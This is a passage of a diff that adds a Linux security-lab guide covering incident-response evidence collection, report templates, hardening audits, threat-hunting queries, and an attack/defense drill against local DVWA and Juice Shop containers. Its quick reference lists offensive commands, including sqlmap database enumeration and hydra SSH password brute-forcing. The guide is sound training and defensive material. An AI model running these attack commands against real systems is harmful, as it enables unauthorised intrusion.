+IR_DIR="$HOME/ai-security-lab/reports/incident-response/IR_$(date +%Y%m%d_%H%M%S)"
+mkdir -p "$IR_DIR"
+
+# Collect evidence
+ps auxef > "$IR_DIR/processes.txt"
+ss -tlnp > "$IR_DIR/network_sockets.txt"
+ss -tnp > "$IR_DIR/active_connections.txt"
+netstat -rn > "$IR_DIR/routing.txt"
+last -n 50 > "$IR_DIR/login_history.txt"
+lastb -n 50 > "$IR_DIR/failed_logins.txt" 2>/dev/null
+find /tmp /var/tmp -type f > "$IR_DIR/tmp_files.txt"
+crontab -l > "$IR_DIR/user_crontab.txt" 2>/dev/null
+cat /etc/crontab >> "$IR_DIR/system_crontab.txt"
+sudo journalctl --since "2 hours ago" --no-pager > "$IR_DIR/recent_logs.txt"
+sudo find / -newer /tmp -type f 2>/dev/null | head -100 > "$IR_DIR/recently_modified.txt"
+
+echo "[✓] Evidence collected in $IR_DIR"
+
+# ══════════════════════════════════════════════════
+# IR STEP 4 — ERADICATION
+# ══════════════════════════════════════════════════
+
+# Remove malicious cron jobs (audit crontab first!)
+# crontab -e
+
+# Remove persistence mechanisms
+# sudo systemctl disable MALICIOUS_SERVICE
+# sudo rm /etc/systemd/system/MALICIOUS_SERVICE.service
+
+# Restore modified files from backup
+# sudo rsync -av /backup/etc/ /etc/
+
+# ══════════════════════════════════════════════════
+# IR STEP 5 — RECOVERY
+# ══════════════════════════════════════════════════
+
+# Reset compromised credentials
+# passwd USERNAME
+
+# Re-enable UFW with hardened rules
+sudo ufw reload
+
+# Restart monitored services
+sudo systemctl restart fail2ban
+sudo systemctl restart suricata
+sudo systemctl restart sshd
+
+echo "[✓] Recovery steps completed"
+```
+
+### 4.2 IR Report Generator
+
+```bash
+cat > ~/ai-security-lab/scripts/reporting/ir_report.sh << 'IREOF'
+#!/bin/bash
+INCIDENT_ID="${1:-IR-$(date +%Y%m%d-%H%M)}"
+ANALYST="${2:-OpenClaw}"
+SEVERITY="${3:-Medium}"
+REPORT="$HOME/ai-security-lab/reports/incident-response/${INCIDENT_ID}.md"
+
+cat > "$REPORT" << TEMPLATE
+# Incident Response Report
+**Incident ID:** $INCIDENT_ID  
+**Date:** $(date '+%Y-%m-%d %H:%M:%S')  
+**Analyst:** $ANALYST  
+**Severity:** $SEVERITY  
+**Status:** In Progress  
+
+---
+
+## Timeline
+
+| Time | Event |
+|------|-------|
+| $(date '+%H:%M') | Incident detected |
+| | Containment initiated |
+| | Investigation started |
+
+---
+
+## Description
+> Describe what happened, how it was detected, and initial indicators.
+
+---
+
+## Affected Systems
+- Host: $(hostname)
+- IP: $(hostname -I | awk '{print $1}')
+- OS: $(uname -a)
+
+---
+
+## Indicators of Compromise (IOCs)
+
+| Type | Value | Description |
+|------|-------|-------------|
+| IP   |       |             |
+| File |       |             |
+| Hash |       |             |
+
+---
+
+## Attack Chain (MITRE ATT&CK)
+
+| Tactic | Technique | Details |
+|--------|-----------|---------|
+| Reconnaissance | | |
+| Initial Access | | |
+| Execution | | |
+| Persistence | | |
+| Privilege Escalation | | |
+| Defense Evasion | | |
+| Lateral Movement | | |
+
+---
+
+## Evidence
+- Logs: \`logs/soc/\`
+- Memory dump: N/A
+- Network capture: N/A
+
+---
+
+## Containment Actions
+- [ ] Blocked source IP
+- [ ] Isolated system
+- [ ] Disabled user account
+
+---
+
+## Root Cause Analysis
+> Root cause of the incident.
+
+---
+
+## Recommendations
+1. 
+2. 
+3. 
+
+---
+
+## Lessons Learned
+> What can be improved in detection/response?
+TEMPLATE
+
+echo "[✓] IR Report: $REPORT"
+IREOF
+
+chmod +x ~/ai-security-lab/scripts/reporting/ir_report.sh
+echo 'alias ir-report="~/ai-security-lab/scripts/reporting/ir_report.sh"' >> ~/.bashrc
+```
+
+---
+
+## DEFENSE 5 — HARDENING & MITIGATION
+
+### 5.1 Linux Hardening Audit Script
+
+```bash
+cat > ~/ai-security-lab/scripts/automation/hardening_audit.sh << 'HARDEOF'
+#!/bin/bash
+# OpenClaw — System Hardening Audit
+
+REPORT="$HOME/ai-security-lab/reports/vulnerabilities/hardening_$(date +%Y%m%d).md"
+PASS=0; FAIL=0; WARN=0
+
+check() {
+  local desc="$1" result="$2"
+  if [[ "$result" == "PASS" ]]; then
+    echo "✅ $desc"; ((PASS++))
+  elif [[ "$result" == "FAIL" ]]; then
+    echo "❌ $desc"; ((FAIL++))
+  else
+    echo "⚠️  $desc"; ((WARN++))
+  fi
+}
+
+echo "# OpenClaw Hardening Audit — $(date)" > "$REPORT"
+echo "" >> "$REPORT"
+echo "## Results" >> "$REPORT"
+
+echo "=== OpenClaw System Hardening Audit ==="
+
+# SSH root login
+ROOT_SSH=$(grep -E "^PermitRootLogin\s+no" /etc/ssh/sshd_config /etc/ssh/sshd_config.d/*.conf 2>/dev/null)
+[[ -n "$ROOT_SSH" ]] && check "SSH: PermitRootLogin no" "PASS" || check "SSH: PermitRootLogin no" "FAIL"
+
+# SSH MaxAuthTries
+MAX_AUTH=$(grep -E "^MaxAuthTries\s+[1-4]$" /etc/ssh/sshd_config /etc/ssh/sshd_config.d/*.conf 2>/dev/null)
+[[ -n "$MAX_AUTH" ]] && check "SSH: MaxAuthTries ≤ 4" "PASS" || check "SSH: MaxAuthTries ≤ 4" "WARN"
+
+# Fail2ban running
+systemctl is-active fail2ban &>/dev/null && \
+  check "Fail2ban: Active" "PASS" || check "Fail2ban: Active" "FAIL"
+
+# UFW active
+ufw status 2>/dev/null | grep -q "active" && \
+  check "UFW: Firewall active" "PASS" || check "UFW: Firewall active" "FAIL"
+
+# ASLR enabled
+ASLR=$(cat /proc/sys/kernel/randomize_va_space)
+[[ "$ASLR" == "2" ]] && check "Kernel: ASLR enabled (2)" "PASS" || check "Kernel: ASLR enabled (2)" "FAIL"
+
+# SYN cookies
+SYN=$(cat /proc/sys/net/ipv4/tcp_syncookies)
+[[ "$SYN" == "1" ]] && check "Network: TCP SYN cookies" "PASS" || check "Network: TCP SYN cookies" "FAIL"
+
+# Suricata running
+systemctl is-active suricata &>/dev/null && \
+  check "Suricata: IDS active" "PASS" || check "Suricata: IDS active" "WARN"
+
+# World-writable files
+WW=$(find /etc /usr /bin /sbin -perm -0002 -type f 2>/dev/null | wc -l)
+[[ "$WW" -eq 0 ]] && check "No world-writable system files" "PASS" || \
+  check "World-writable files found: $WW" "FAIL"
+
+# SUID binaries count
+SUID=$(find /usr /bin /sbin -perm -4000 -type f 2>/dev/null | wc -l)
+[[ "$SUID" -le 15 ]] && check "SUID binary count reasonable ($SUID)" "PASS" || \
+  check "High SUID binary count ($SUID)" "WARN"
+
+# Password aging
+MAXDAYS=$(grep "^PASS_MAX_DAYS" /etc/login.defs | awk '{print $2}')
+[[ "${MAXDAYS:-99999}" -le 90 ]] && check "Password max age ≤ 90 days" "PASS" || \
+  check "Password max age not enforced" "WARN"
+
+echo ""
+echo "═══════════════════════════════════"
+echo "  PASS: $PASS | FAIL: $FAIL | WARN: $WARN"
+echo "═══════════════════════════════════"
+echo "Report: $REPORT"
+HARDEOF
+
+chmod +x ~/ai-security-lab/scripts/automation/hardening_audit.sh
+echo 'alias hardening-audit="~/ai-security-lab/scripts/automation/hardening_audit.sh"' >> ~/.bashrc
+```
+
+---
+
+## DEFENSE 6 — THREAT HUNTING
+
+### 6.1 Threat Hunting Queries
+
+```bash
+# ═══════════════════════════════════════
+# HUNT 1: Unusual outbound connections
+# ═══════════════════════════════════════
+ss -tnp | awk 'NR>1 && $1=="ESTAB"' | \
+  grep -v "127.0.0.1\|::1" | \
+  awk '{print $5, $6}' | sort | uniq
+
+# ═══════════════════════════════════════
+# HUNT 2: Processes running from /tmp
+# ═══════════════════════════════════════
+ps auxef | grep -E "^.*/tmp/|^.*/dev/shm/"
+ls -la /proc/*/exe 2>/dev/null | grep -E "tmp|shm|deleted"
+
+# ═══════════════════════════════════════
+# HUNT 3: Recently created executables
+# ═══════════════════════════════════════
+find /tmp /var/tmp /dev/shm -type f -executable 2>/dev/null
+find / -newer /var/log/lastlog -perm /111 -type f 2>/dev/null | \
+  grep -v proc | head -20
+
+# ═══════════════════════════════════════
+# HUNT 4: Backdoor SUID shells
+# ═══════════════════════════════════════
+find / -perm -4000 -type f 2>/dev/null | \
+  while read f; do file "$f" | grep -i "shell\|script\|ELF" | grep -v "^$" && echo "  -> $f"; done
+
+# ═══════════════════════════════════════
+# HUNT 5: Suspicious cron persistence
+# ═══════════════════════════════════════
+for user in $(cut -d: -f1 /etc/passwd); do
+  CRON=$(crontab -u "$user" -l 2>/dev/null | grep -v "^#\|^$")
+  [[ -n "$CRON" ]] && echo "[USER: $user] $CRON"
+done
+
+# ═══════════════════════════════════════
+# HUNT 6: Unusual SSH authorized_keys
+# ═══════════════════════════════════════
+find /home /root -name "authorized_keys" 2>/dev/null -exec echo "=== {} ===" \; -exec cat {} \;
+
+# ═══════════════════════════════════════
+# HUNT 7: LD_PRELOAD hijacking
+# ═══════════════════════════════════════
+grep -r "LD_PRELOAD" /etc/environment /etc/ld.so.preload 2>/dev/null
+ls -la /etc/ld.so.preload 2>/dev/null
+
+# ═══════════════════════════════════════
+# HUNT 8: Systemd service persistence
+# ═══════════════════════════════════════
+systemctl list-units --type=service --state=running | \
+  grep -v "\.mount\|\.socket\|\.target" | \
+  awk '{print $1}' | \
+  xargs -I{} bash -c 'f=$(systemctl show {} -p FragmentPath --value); echo "[{}] $f"'
+```
+
+---
+
+## OPENCLAW AUTOMATION
+
+### Combined Attack-Defense Drill Script
+
+```bash
+cat > ~/ai-security-lab/scripts/automation/full_drill.sh << 'DRILLEOF'
+#!/bin/bash
+# OpenClaw — Full Attack & Defense Drill
+# Runs: lab start → recon → attack → detection verification → report
+# AUTHORIZED LAB ENVIRONMENTS ONLY
+
+set -euo pipefail
+DATE=$(date +%Y%m%d_%H%M%S)
+REPORT="$HOME/ai-security-lab/reports/pentest/drill_${DATE}.md"
+
+banner() { echo -e "\n\033[1;36m════════════════════════════════════\033[0m\n  $1\n\033[1;36m════════════════════════════════════\033[0m"; }
+
+banner "🦅 OpenClaw Full Security Drill — $DATE"
+echo "⚠ This drill targets LOCAL AUTHORIZED lab containers only."
+read -p "Start drill? (yes/no): " CONFIRM
+[[ "$CONFIRM" != "yes" ]] && echo "Aborted." && exit 1
+
+# ── Phase 1: Start labs ──
+banner "Phase 1: Starting Lab Targets"
+docker start dvwa 2>/dev/null || docker run -d -p 80:80 --name dvwa vulnerables/web-dvwa
+docker start juiceshop 2>/dev/null || docker run -d -p 3000:3000 --name juiceshop bkimminich/juice-shop
+sleep 5
+echo "[✓] Labs started"
+
+# ── Phase 2: Recon ──
+banner "Phase 2: Reconnaissance"
+mkdir -p "$HOME/ai-security-lab/scans/nmap" "$HOME/ai-security-lab/scans/nuclei"
+nmap -sV -p 80,3000,443 --open localhost \
+  -oN "$HOME/ai-security-lab/scans/nmap/drill_${DATE}.txt" 2>/dev/null
+echo "[✓] Nmap complete"
+
+# ── Phase 3: Web scan ──
+banner "Phase 3: Vulnerability Scan"
+nuclei -u http://localhost -u http://localhost:3000 \
+  -tags owasp,sqli,xss -severity medium,high,critical \
+  -rate-limit 20 \
+  -o "$HOME/ai-security-lab/scans/nuclei/drill_${DATE}.txt" 2>/dev/null || true
+echo "[✓] Nuclei scan complete"
+
+# ── Phase 4: Blue team verification ──
+banner "Phase 4: Blue Team — Detection Check"
+SSH_FAILS=$(journalctl -u sshd --since "30 minutes ago" --no-pager 2>/dev/null | \
+  grep "Failed" | wc -l)
+SURICATA_ALERTS=$(cat /var/log/suricata/fast.log 2>/dev/null | wc -l)
+echo "SSH failures (30min): $SSH_FAILS"
+echo "Suricata alerts total: $SURICATA_ALERTS"
+
+# ── Phase 5: Generate report ──
+banner "Phase 5: Report Generation"
+cat > "$REPORT" << TEMPLATE
+# OpenClaw Security Drill Report
+**Date:** $DATE  
+**Environment:** Local Lab (Docker)  
+**Targets:** DVWA (localhost:80), Juice Shop (localhost:3000)
+
+## Recon Results
+\`\`\`
+$(cat "$HOME/ai-security-lab/scans/nmap/drill_${DATE}.txt" 2>/dev/null | tail -30)
+\`\`\`
+
+## Vulnerability Findings
+\`\`\`
+$(cat "$HOME/ai-security-lab/scans/nuclei/drill_${DATE}.txt" 2>/dev/null | head -30)
+\`\`\`
+
+## Blue Team Detection
+- SSH failures (30min): $SSH_FAILS
+- Suricata alerts: $SURICATA_ALERTS
+- Fail2ban status: $(fail2ban-client status 2>/dev/null | head -3 || echo "N/A")
+
+## Verdict
+$(if [[ "$SURICATA_ALERTS" -gt 0 ]]; then
+  echo "✅ IDS detected activity — Blue team detection WORKING"
+else
+  echo "⚠ No IDS alerts — Review Suricata rules"
+fi)
+TEMPLATE
+
+echo "[✓] Drill complete. Report: $REPORT"
+banner "🦅 OpenClaw Drill Complete"
+DRILLEOF
+
+chmod +x ~/ai-security-lab/scripts/automation/full_drill.sh
+echo 'alias run-drill="~/ai-security-lab/scripts/automation/full_drill.sh"' >> ~/.bashrc
+```
+
+---
+
+## QUICK REFERENCE — ALL COMMANDS
+
+```bash
+# ─── RED TEAM ────────────────────────────────
+pentest-recon <target>          # Full recon workflow
+nmap -sV -sC localhost          # Quick service scan
+nuclei -u http://localhost      # Vuln scan
+gobuster dir -u http://localhost -w wordlist.txt
+sqlmap -u "http://localhost/sqli?id=1" --dbs --batch
+hydra -l admin -P passwords.txt ssh://target
+msfconsole -q                   # Metasploit
+
+# ─── BLUE TEAM ───────────────────────────────
+soc-report                      # Run SOC report
+watch-ssh                       # Live SSH monitor
+fim-baseline                    # Create FIM baseline
+fim-check                       # Verify file integrity
+hardening-audit                 # Security audit
+
+# ─── LABS ────────────────────────────────────
+lab-dvwa                        # Start DVWA
+lab-juiceshop                   # Start Juice Shop
+lab-msf2                        # Start Metasploitable
+lab-stop                        # Stop all labs
+
+# ─── AUTOMATION ──────────────────────────────
+run-drill                       # Full attack/defense drill
+ir-report IR-2024-001           # Incident response report
+gen-report <target>             # Pentest report skeleton
+
+# ─── OPENCLAW AI ─────────────────────────────
+openclaw                        # Start AI assistant
+```
+
+---
+
+*Attack & Defense Ops — Arch Linux | Lab Environments Only*  
+*Blue Team + Red Team | Ethical Use Only*
